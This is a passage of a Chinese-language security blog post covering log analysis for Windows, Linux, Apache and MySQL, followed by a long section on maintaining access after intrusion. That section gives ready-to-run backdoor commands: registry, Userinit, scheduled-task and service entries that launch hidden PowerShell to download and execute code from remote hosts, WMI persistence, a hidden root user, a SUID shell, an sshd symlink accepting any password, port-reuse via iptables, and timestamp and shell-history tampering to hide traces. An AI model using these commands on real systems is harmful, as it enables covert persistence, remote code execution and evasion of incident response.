class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">diff -c -a -r cms1 cms2</span><br><span class=\"line\">md5sum比较两个文件夹下面文件是否相同</span><br><span class=\"line\"></span><br><span class=\"line\">Copy文件夹之后，检测两个文件夹（dir1，dir2）下文件是否相同。logdir 是任何一个存放生成文件的目录</span><br><span class=\"line\">cd dir1</span><br><span class=\"line\">find ./ -type f -exec md5sum &#123;&#125; \\; | sort -k 2  &gt; result.txt</span><br><span class=\"line\"></span><br><span class=\"line\">cd dir2</span><br><span class=\"line\">find ./ -type f -exec md5sum &#123;&#125; \\; | sort -k 2  &gt; result.txt</span><br><span class=\"line\">cd logdir</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">diff result.txt result.txt</span><br></pre></td></tr></table></figure>\n<p>3. 工具</p>\n<p>winMerge</p>\n<p>beyond compare</p>\n<h2 id=\"日志分析\"><a class=\"markdownIt-Anchor\" href=\"#日志分析\">#</a> 日志分析</h2>\n<h3 id=\"windows日志分析\"><a class=\"markdownIt-Anchor\" href=\"#windows日志分析\">#</a> Windows 日志分析</h3>\n<p>Windows 系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。</p>\n<p>Windows 主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志。</p>\n<blockquote>\n<p>系统日志</p>\n<p>记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型由 Windows NT/2000 操作系统预先定义。</p>\n<p>默认位置： % SystemRoot%\\System32\\Winevt\\Logs\\System.evtx</p>\n<p>应用程序日志</p>\n<p>包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。</p>\n<p>默认位置：% SystemRoot%\\System32\\Winevt\\Logs\\Application.evtx</p>\n<p>安全日志</p>\n<p>记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。</p>\n<p>默认位置：% SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx</p>\n</blockquote>\n<p><strong>开启审核策略</strong></p>\n<p>Windows Server 2008 R2 系统的审核功能在默认状态下并没有启用 ，建议开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109145256851.png\" alt=\"image-20221109145256851\"></p>\n<p><strong>设置日志属性</strong></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109192149696.png\" alt=\"image-20221109192149696\"></p>\n<h4 id=\"日志分析-2\"><a class=\"markdownIt-Anchor\" href=\"#日志分析-2\">#</a> 日志分析</h4>\n<p>对于 Windows 事件日志分析，不同的 EVENT ID 代表了不同的意义，摘录一些常见的安全事件的说明：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109144436445.png\" alt=\"image-20221109144436445\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109153134531.png\" alt=\"image-20221109153134531\"></p>\n<p>4634,4647 远程登录注销时触发</p>\n<h4 id=\"工具分析\"><a class=\"markdownIt-Anchor\" href=\"#工具分析\">#</a> 工具分析：</h4>\n<p><strong>Log Parser</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">登录成功的所有事件</span><br><span class=\"line\">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\\Security.evtx where EventID=4624&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">指定登录时间范围的事件：</span><br><span class=\"line\">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\\Security.evtx where TimeGenerated&gt;&#x27;2018-06-19 23:32:11&#x27; and TimeGenerated&lt;&#x27;2018-06-20 23:34:00&#x27; and EventID=4624&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">提取登录成功的用户名和IP：</span><br><span class=\"line\">LogParser.exe -i:EVT  –o:DATAGRID  &quot;SELECT EXTRACT_TOKEN(Message,13,&#x27; &#x27;) as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,&#x27;|&#x27;) as Username,EXTRACT_TOKEN(Message,38,&#x27; &#x27;) as Loginip FROM c:\\Security.evtx where EventID=4624&quot;</span><br></pre></td></tr></table></figure>\n<p><strong>LogParser Lizard</strong></p>\n<p><strong>Event Log Explorer</strong></p>\n<h3 id=\"linux-日志分析\"><a class=\"markdownIt-Anchor\" href=\"#linux-日志分析\">#</a> linux 日志分析</h3>\n<p>日志默认存放位置：/var/log/</p>\n<p>查看日志配置情况：more /etc/rsyslog.conf</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109192416867.png\" alt=\"image-20221109192416867\"></p>\n<p>比较重要的几个日志：<br>\n登录失败记录：/var/log/btmp     //lastb</p>\n<p>​\t最后一次登录：/var/log/lastlog  //lastlog</p>\n<p>​\t登录成功记录: /var/log/wtmp     //last</p>\n<p>​\t登录日志记录：/var/log/secure</p>\n<p>​\t目前登录用户信息：/var/run/utmp  //w、who、users</p>\n<p>​\t历史命令记录：history</p>\n<p>​\t仅清理当前用户： history -c</p>\n<p>日志分析 find grep egrep awk sed</p>\n<h3 id=\"web-日志分析\"><a class=\"markdownIt-Anchor\" href=\"#web-日志分析\">#</a> web 日志分析</h3>\n<p>Apache 日志分析技巧：</p>\n<p>Web 访问日志记录了 Web 服务器接收处理请求及运行时错误等各种原始信息。通过对 WEB 日志进行的安全分析，不仅可以帮助我们定位攻击者，还可以帮助我们还原攻击路径，找到网站存在的安全漏洞并进行修复。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、列出当天访问次数最多的IP命令：</span><br><span class=\"line\">cut -d- -f 1 log_file|uniq -c | sort -rn | head -20</span><br><span class=\"line\"></span><br><span class=\"line\">2、查看当天有多少个IP访问：</span><br><span class=\"line\">awk &#x27;&#123;print $1&#125;&#x27; log_file|sort|uniq|wc -l</span><br><span class=\"line\"></span><br><span class=\"line\">3、查看某一个页面被访问的次数：</span><br><span class=\"line\">grep &quot;/index.php&quot; log_file | wc -l</span><br><span class=\"line\"></span><br><span class=\"line\">4、查看每一个IP访问了多少个页面：</span><br><span class=\"line\">awk &#x27;&#123;++S[$1]&#125; END &#123;for (a in S) print a,S[a]&#125;&#x27; log_file</span><br><span class=\"line\"></span><br><span class=\"line\">5、将每个IP访问的页面数进行从小到大排序：</span><br><span class=\"line\">awk &#x27;&#123;++S[$1]&#125; END &#123;for (a in S) print S[a],a&#125;&#x27; log_file | sort -n</span><br><span class=\"line\"></span><br><span class=\"line\">6、查看某一个IP访问了哪些页面：</span><br><span class=\"line\">grep ^111.111.111.111 log_file| awk &#x27;&#123;print $1,$7&#125;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">7、去掉搜索引擎统计当天的页面：</span><br><span class=\"line\">awk &#x27;&#123;print $12,$1&#125;&#x27; log_file | grep ^\\&quot;Mozilla | awk &#x27;&#123;print $2&#125;&#x27; |sort | uniq | wc -l</span><br><span class=\"line\"></span><br><span class=\"line\">8、查看2018年6月21日14时这一个小时内有多少IP访问:</span><br><span class=\"line\">awk &#x27;&#123;print $4,$1&#125;&#x27; log_file | grep 21/Jun/2018:14 | awk &#x27;&#123;print $2&#125;&#x27;| sort | uniq | wc -l\t</span><br></pre></td></tr></table></figure>\n<p>日志分析过程</p>\n<p>1、定位攻击源</p>\n<p>2、搜索相关日志记录</p>\n<p>3、对找到的访问日志进行解读，攻击者大致的访问路径如下：</p>\n<p>4. 加固攻击者访问的网站</p>\n<h3 id=\"mysql日志分析\"><a class=\"markdownIt-Anchor\" href=\"#mysql日志分析\">#</a> mysql 日志分析</h3>\n<p>设置日志</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、查看log配置信息</span><br><span class=\"line\">show variables like &#x27;%general%&#x27;;</span><br><span class=\"line\">2、开启日志</span><br><span class=\"line\">SET GLOBAL general_log = &#x27;On&#x27;;</span><br><span class=\"line\">3、指定日志文件路径</span><br><span class=\"line\">#SET GLOBAL general_log_file = &#x27;/var/lib/mysql/mysql.log&#x27;;</span><br></pre></td></tr></table></figure>\n<p>主要需要注意爆破 root 密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#有哪些IP在爆破</span><br><span class=\"line\">grep  &quot;Access denied&quot; mysql.log |cut -d &quot;&#x27;&quot; -f4|uniq -c|sort -nr</span><br><span class=\"line\">     27 192.168.204.1</span><br><span class=\"line\"></span><br><span class=\"line\">#爆破用户名字典都有哪些</span><br><span class=\"line\">grep  &quot;Access denied&quot; mysql.log |cut -d &quot;&#x27;&quot; -f2|uniq -c|sort -nr</span><br><span class=\"line\">     13 mysql</span><br><span class=\"line\">     12 root</span><br><span class=\"line\">      1 root</span><br><span class=\"line\">      1 mysql</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>如果爆破密码，失败的时候会显示 &quot;Access denied&quot;，可靠此进行分析</p>\n<h2 id=\"权限维持\"><a class=\"markdownIt-Anchor\" href=\"#权限维持\">#</a> 权限维持</h2>\n<h3 id=\"windows-2\"><a class=\"markdownIt-Anchor\" href=\"#windows-2\">#</a> Windows</h3>\n<h4 id=\"0x01-注册表自启动\"><a class=\"markdownIt-Anchor\" href=\"#0x01-注册表自启动\">#</a> 0x01 注册表自启动</h4>\n<p>通过修改注册表自启动键值，添加一个木马程序路径，实现开机自启动。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># Run键 </span><br><span class=\"line\">HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</span><br><span class=\"line\">HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</span><br><span class=\"line\"></span><br><span class=\"line\"># Winlogon\\Userinit键</span><br><span class=\"line\">HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon</span><br><span class=\"line\">HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon</span><br><span class=\"line\"></span><br><span class=\"line\">类似的还有很多,关键词：注册表启动键值。</span><br></pre></td></tr></table></figure>\n<p><strong>不落地的后门通过 cs 的 web 投递生成</strong></p>\n<p>使用以下命令可以一键实现无文件注册表后门：不落地</p>\n<p><code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v &quot;Keyname&quot; /t REG_SZ /d &quot;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c \\&quot;IEX ((new-object net.webclient).downloadstring('http://192.168.174.131/a'))\\&quot;&quot; /f</code></p>\n<p><strong>Logon Scripts 后门</strong></p>\n<p>注册表路径：HKEY_CURRENT_USER\\Environment\\</p>\n<p>创建字符串键值：  UserInitMprLogonScript，键值设置为 bat 的绝对路径： <code>c:\\test.bat</code></p>\n<p><strong>userinit 后门</strong></p>\n<p>在用户进行登陆时，winlogon 运行指定的程序。根据官方文档，可以更改它的值来添加与删除程序。</p>\n<p>利用 USERINIT 注册表键实现无文件后门：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon]</span><br><span class=\"line\"> </span><br><span class=\"line\">&quot;Userinit&quot;=&quot;C:\\\\Windows\\\\system32\\\\userinit.exe,C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -nop -w hidden -c \\&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.28.142:8888/logo.gif&#x27;))\\&quot;&quot;</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x02-组策略设置脚本启动\"><a class=\"markdownIt-Anchor\" href=\"#0x02-组策略设置脚本启动\">#</a> 0x02 组策略设置脚本启动</h4>\n<p>运行 gpedit.msc 进入本地组策略，通过 Windows 设置的 “脚本 (启动 / 关机)” 项来说实现。因为其极具隐蔽性，因此常常被攻击者利用来做服务器后门。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109181141835.png\" alt=\"image-20221109181141835\"></p>\n<p>脚本名写 powershell 绝对路径，脚本参数写 web 投递后门</p>\n<h4 id=\"0x03-计划任务\"><a class=\"markdownIt-Anchor\" href=\"#0x03-计划任务\">#</a> 0x03 计划任务</h4>\n<p>通过 window 系统的任务计划程序功能实现定时启动某个任务，执行某个脚本。</p>\n<p>使用以下命令可以一键实现：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">schtasks /create /sc minute /mo 1 /tn &quot;Security Script&quot; /tr &quot;powershell.exe -nop -w hidden -c \\&quot;IEX ((new-object net.webclient).downloadstring(\\&quot;\\&quot;\\&quot;http://192.168.3.48:8080/T5uEhVubWqF\\&quot;\\&quot;\\&quot;))\\&quot;&quot;</span><br></pre></td></tr></table></figure>\n<p>容易遇到的问题：cmd 命令行执行单引号会被替换成双引号，故这里使用三个双引号替代。</p>\n<p>合理的日期：某月某月凌晨三点</p>\n<h4 id=\"0x04-服务自启动\"><a class=\"markdownIt-Anchor\" href=\"#0x04-服务自启动\">#</a> 0x04 服务自启动</h4>\n<p>通过服务设置自启动，结合 powershell 实现无文件后门。</p>\n<p>使用以下命令可实现：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sc create &quot;KeyName&quot; binpath= &quot;cmd /c start powershell.exe -nop -w hidden -c \\&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.3.48:8080/T5uEhVubWqF&#x27;))\\&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">sc description  KeyName &quot;Just For Test&quot;   //设置服务的描述字符串</span><br><span class=\"line\">sc config Name start= auto                //设置这个服务为自动启动</span><br><span class=\"line\">net start Name                            //启动服务</span><br></pre></td></tr></table></figure>\n<p>成功创建了一个自启动服务</p>\n<p><strong>通过服务自启动上线权限为 system</strong></p>\n<h4 id=\"0x05-wmi后门\"><a class=\"markdownIt-Anchor\" href=\"#0x05-wmi后门\">#</a> 0x05 WMI 后门</h4>\n<p>在 2015 年的 blackhat 大会上 Matt Graeber 介绍了一种无文件后门就是用的 WMI。这里可以利用一个工具 powersploit，下面用它的 Persistence 模块来示范一个简单的例子。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Import-Module .\\Persistence\\Persistence.psm1</span><br><span class=\"line\">$ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -Daily -At &#x27;3 PM&#x27;</span><br><span class=\"line\">$UserOptions = New-UserPersistenceOption -Registry -AtLogon</span><br><span class=\"line\">Add-Persistence -FilePath .\\web.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose</span><br></pre></td></tr></table></figure>\n<h3 id=\"linux-2\"><a class=\"markdownIt-Anchor\" href=\"#linux-2\">#</a> linux</h3>\n<h4 id=\"0x00隐藏文件\"><a class=\"markdownIt-Anchor\" href=\"#0x00隐藏文件\">#</a> 0x00 隐藏文件</h4>\n<p>Linux 下创建一个隐藏文件： <code>touch  .test.txt</code></p>\n<h4 id=\"0x01隐藏文件时间戳\"><a class=\"markdownIt-Anchor\" href=\"#0x01隐藏文件时间戳\">#</a> 0x01 隐藏文件时间戳</h4>\n<p>Unix 下藏后门必须要修改时间，否则很容易被发现，直接利用 touch 就可以了。</p>\n<p>比如参考 index.php 的时间，再赋给 webshell.php，结果两个文件的时间就一样了。</p>\n<p>touch -r index.php webshell.php</p>\n<p>或者直接将时间戳修改成某年某月某日。如下 2014 年 01 月 02 日。</p>\n<p>touch -t 1401021042.30 webshell.php</p>\n<h4 id=\"0x03-隐藏权限\"><a class=\"markdownIt-Anchor\" href=\"#0x03-隐藏权限\">#</a> 0x03 隐藏权限</h4>\n<p>在 Linux 中，使用 chattr 命令来防止 root 和其他管理用户误删除和修改重要文件及目录，此权限用 ls -l 是查看不出来的，从而达到隐藏权限的目的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chattr +i evil.php 锁定文件</span><br><span class=\"line\">lsattr  evil.php   属性查看</span><br><span class=\"line\">chattr -i evil.php 解除锁定</span><br><span class=\"line\">rm -rf 1.evil.php  删除文件</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x04隐藏历史命令\"><a class=\"markdownIt-Anchor\" href=\"#0x04隐藏历史命令\">#</a> 0x04 隐藏历史命令</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[space]set +o history</span><br><span class=\"line\">备注：[space] 表示空格。并且由于空格的缘故，该命令本身也不会被记录。</span><br></pre></td></tr></table></figure>\n<p>输出历史记录中匹配的命令，每一条前面会有个数字。从历史记录中删除那个指定的项：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">history -d [num]</span><br></pre></td></tr></table></figure>\n<p>这种技巧是关键记录删除，或者我们可以暴力点，比如前 150 行是用户的正常操作记录，150 以后是攻击者操作记录。我们可以只保留正常的操作，删除攻击痕迹的历史操作记录，这里，我们只保留前 150 行：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sed -i &#x27;150,$d&#x27; .bash_history</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x05隐藏ssh\"><a class=\"markdownIt-Anchor\" href=\"#0x05隐藏ssh\">#</a> 0x05 隐藏 ssh</h4>\n<p>#隐身登录系统，不会被 w、who、last 等指令检测到。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh -T root@127.0.0.1 /bin/bash -i</span><br></pre></td></tr></table></figure>\n<p>这是因为 w 命令显示信息来源于 utmp，last 来源于 wtmp，并不是所有程序登录的时候都会调用 utmp 和 wtmp 日志记录接口，只有交互式会话，才会调用 utmp 和 wtmp 的日志记录接口，比如通过 tty 或者 pts 或者图形界面登录的都会调用 utmp 和 wtmp 日志记录接口，然后我们在使用 w 和 last 命令的时候就会发现登录信息</p>\n<p>不记录 ssh 公钥在本地.ssh 目录中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i</span><br><span class=\"line\">-T 表示不分配伪终端 （正常的会话，在分配伪终端之后才会调用utmp和wtmp的日志接口）</span><br><span class=\"line\">/usr/bin/bash -i  表示在登录之后 调用bash命令</span><br><span class=\"line\">-i 表示是交互式shell</span><br></pre></td></tr></table></figure>\n<p>ssh -lroot 192.168.12.51/usr/bin/bash 其实就相当于登录之后直接调用 bash 这个名，此时系统没有为其分配 tty，不算一个完整交互式会话，只不过 bash 接受输入，然后有输出，让我们误以为是交互式会话，其实不然，你可以将 /usr/bin/bash 替换成 /usr/bin/ls 试一下，就是简单执行以下就退出了</p>\n<p>通过 ps -ef  和 lsof -i:22  仍然可以看到</p>\n<p>如果已经退出，那么可以到 secure 日志中找</p>\n<h4 id=\"0x06端口复用\"><a class=\"markdownIt-Anchor\" href=\"#0x06端口复用\">#</a> 0x06 端口复用</h4>\n<p>第二种方式：利用 IPTables 进行端口复用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 端口复用链</span><br><span class=\"line\">iptables -t nat -N LETMEIN</span><br><span class=\"line\"># 端口复用规则</span><br><span class=\"line\">iptables -t nat  -A LETMEIN -p tcp -j REDIRECT --to-port 22</span><br><span class=\"line\"># 开启开关</span><br><span class=\"line\">iptables -A INPUT -p tcp -m string --string &#x27;threathuntercoming&#x27; --algo bm -m recent --set --name letmein --rsource -j ACCEPT</span><br><span class=\"line\"># 关闭开关</span><br><span class=\"line\">iptables -A INPUT -p tcp -m string --string &#x27;threathunterleaving&#x27; --algo bm -m recent --name letmein --remove -j ACCEPT</span><br><span class=\"line\"># let&#x27;s do it</span><br><span class=\"line\">iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#开启复用</span><br><span class=\"line\">echo threathuntercoming | socat - tcp:192.168.28.128:80</span><br><span class=\"line\">#ssh使用80端口进行登录</span><br><span class=\"line\">ssh -p 80 root@192.168.28.128</span><br><span class=\"line\">#关闭复用</span><br><span class=\"line\">echo threathunterleaving | socat - tcp:192.168.28.128:80</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x00添加用户\"><a class=\"markdownIt-Anchor\" href=\"#0x00添加用户\">#</a> 0x00 添加用户</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 创建一个用户名guest，密码123456的root用户</span><br><span class=\"line\">useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test</span><br></pre></td></tr></table></figure>\n<p>排查</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 查询特权用户特权用户(uid 为0)</span><br><span class=\"line\">[root@localhost ~]# awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span><br><span class=\"line\"># 查询可以远程登录的帐号信息</span><br><span class=\"line\">[root@localhost ~]# awk &#x27;/\\$1|\\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br><span class=\"line\"># 除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class=\"line\">[root@localhost ~]# more /etc/sudoers | grep -v &quot;^#\\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x01suid\"><a class=\"markdownIt-Anchor\" href=\"#0x01suid\">#</a> 0x01SUID</h4>\n<p>Suid shell 是一种可用于以拥有者权限运行的 shell。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">配合普通用户权限使用</span><br><span class=\"line\">cp /bin/bash /tmp/shell</span><br><span class=\"line\">chmod u+s /tmp/shell</span><br><span class=\"line\"></span><br><span class=\"line\">/tmp/shell</span><br><span class=\"line\">一般将其命名为find等系统命令，存在位置为/usr/bin</span><br></pre></td></tr></table></figure>\n<p>排查技巧：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 在Linux中查找SUID设置的文件</span><br><span class=\"line\">find . -perm /4000 </span><br><span class=\"line\"># 在Linux中查找使用SGID设置的文件</span><br><span class=\"line\">find . -perm /2000</span><br><span class=\"line\"># 取消s权限</span><br><span class=\"line\">chmod u-s /tmp/shell</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x02-ssh免密登录\"><a class=\"markdownIt-Anchor\" href=\"#0x02-ssh免密登录\">#</a> 0x02 ssh 免密登录</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa\t</span><br></pre></td></tr></table></figure>\n<p>再将公钥复制到.ssh 中 <code>/root/.ssh/authorized_keys</code></p>\n<h4 id=\"0x03-软连接\"><a class=\"markdownIt-Anchor\" href=\"#0x03-软连接\">#</a> 0x03 软连接</h4>\n<p>在 sshd 服务配置运行 PAM 认证的前提下，PAM 配置文件中控制标志为 sufficient 时只要 pam_rootok 模块检测 uid 为 0 即 root 权限即可成功认证登陆。通过软连接的方式，实质上 PAM 认证是通过软连接的文件名  <code>/tmp/su</code>  在 <code>/etc/pam.d/</code>  目录下寻找对应的 PAM 配置文件 (如: /etc/pam.d/su)，任意密码登陆的核心是 <code>auth sufficient pam_rootok.so</code> ，所以只要 PAM 配置文件中包含此配置即可 SSH 任意密码登陆，除了 su 中之外还有 chsh、chfn 同样可以。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888</span><br></pre></td></tr></table></figure>\n<p>执行完之后，任何一台机器 <code>ssh root@IP -p 8888</code> ，输入任意密码，成功登录。</p>\n<p>排查技巧：进程、端口都可以发现异常， kill -s 9 PID 结束进程即可清除后门。</p>\n<h4 id=\"0x04crontab反弹shell\"><a class=\"markdownIt-Anchor\" 